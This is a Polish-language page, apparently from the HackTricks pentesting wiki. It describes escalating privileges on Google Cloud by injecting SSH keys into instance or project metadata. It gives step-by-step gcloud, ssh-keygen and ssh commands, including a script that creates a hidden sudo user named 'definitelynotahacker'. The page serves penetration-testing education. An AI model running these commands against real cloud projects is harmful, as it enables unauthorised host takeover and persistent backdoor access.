# GCP - Dodaj niestandardowe metadane SSH

## GCP - Dodaj niestandardowe metadane SSH

{{#include ../../../../banners/hacktricks-training.md}}

### Modyfikacja metadanych <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Modyfikacja metadanych na instancji może prowadzić do **znaczących zagrożeń bezpieczeństwa, jeśli atakujący zdobędzie niezbędne uprawnienia**.

#### **Włączenie kluczy SSH do niestandardowych metadanych**

Na GCP, **systemy Linux** często wykonują skrypty z [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Krytycznym komponentem tego jest [demon kont](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), który jest zaprojektowany do **regularnego sprawdzania** punktu końcowego metadanych instancji w poszukiwaniu **aktualizacji autoryzowanych kluczy publicznych SSH**.

Dlatego, jeśli atakujący może modyfikować niestandardowe metadane, może sprawić, że demon znajdzie nowy klucz publiczny, który zostanie przetworzony i **zintegrowany z lokalnym systemem**. Klucz zostanie dodany do pliku `~/.ssh/authorized_keys` **istniejącego użytkownika lub potencjalnie stworzy nowego użytkownika z uprawnieniami `sudo`**, w zależności od formatu klucza. A atakujący będzie mógł przejąć kontrolę nad hostem.

#### **Dodaj klucz SSH do istniejącego użytkownika z uprawnieniami**

1. **Zbadaj istniejące klucze SSH na instancji:**

- Wykonaj polecenie, aby opisać instancję i jej metadane, aby zlokalizować istniejące klucze SSH. Odpowiednia sekcja w wyniku będzie pod `metadata`, a konkretnie klucz `ssh-keys`.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```

- Zwróć uwagę na format kluczy SSH: nazwa użytkownika poprzedza klucz, oddzielona dwukropkiem.

2. **Przygotuj plik tekstowy dla metadanych klucza SSH:**
- Zapisz szczegóły nazw użytkowników i ich odpowiadających kluczy SSH w pliku tekstowym o nazwie `meta.txt`. Jest to niezbędne do zachowania istniejących kluczy podczas dodawania nowych.
3. **Wygeneruj nowy klucz SSH dla docelowego użytkownika (`alice` w tym przykładzie):**

- Użyj polecenia `ssh-keygen`, aby wygenerować nowy klucz SSH, upewniając się, że pole komentarza (`-C`) odpowiada docelowej nazwie użytkownika.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```

- Dodaj nowy klucz publiczny do `meta.txt`, naśladując format znaleziony w metadanych instancji.

4. **Zaktualizuj metadane klucza SSH instancji:**

- Zastosuj zaktualizowane metadane klucza SSH do instancji, używając polecenia `gcloud compute instances add-metadata`.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Uzyskaj dostęp do instancji za pomocą nowego klucza SSH:**

- Połącz się z instancją za pomocą SSH, używając nowego klucza, uzyskując dostęp do powłoki w kontekście docelowego użytkownika (`alice` w tym przykładzie).

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **Utwórz nowego użytkownika z uprawnieniami i dodaj klucz SSH**

Jeśli nie znaleziono interesującego użytkownika, można utworzyć nowego, któremu nadane zostaną uprawnienia `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### Klucze SSH na poziomie projektu <a href="#sshing-around" id="sshing-around"></a>

Możliwe jest rozszerzenie zasięgu dostępu SSH do wielu Maszyn Wirtualnych (VM) w środowisku chmurowym poprzez **zastosowanie kluczy SSH na poziomie projektu**. To podejście umożliwia dostęp SSH do każdej instancji w projekcie, która nie zablokowała wyraźnie kluczy SSH na poziomie projektu. Oto podsumowany przewodnik:

1. **Zastosuj klucze SSH na poziomie projektu:**

- Użyj polecenia `gcloud compute project-info add-metadata`, aby dodać klucze SSH z `meta.txt` do metadanych projektu. Ta akcja zapewnia, że klucze SSH są rozpoznawane we wszystkich VM w projekcie, chyba że VM ma włączoną opcję "Zablokuj klucze SSH na poziomie projektu".

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **SSH do instancji przy użyciu kluczy na poziomie projektu:**
- Mając klucze SSH na poziomie projektu, możesz połączyć się SSH z dowolną instancją w projekcie. Instancje, które nie blokują kluczy na poziomie projektu, zaakceptują klucz SSH, przyznając dostęp.
- Bezpośrednią metodą połączenia SSH z instancją jest użycie polecenia `gcloud compute ssh [INSTANCE]`. To polecenie wykorzystuje twoją bieżącą nazwę użytkownika i klucze SSH ustawione na poziomie projektu, aby spróbować uzyskać dostęp.

## Referencje

- [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{{#include ../../../../banners/hacktricks-training.md}}
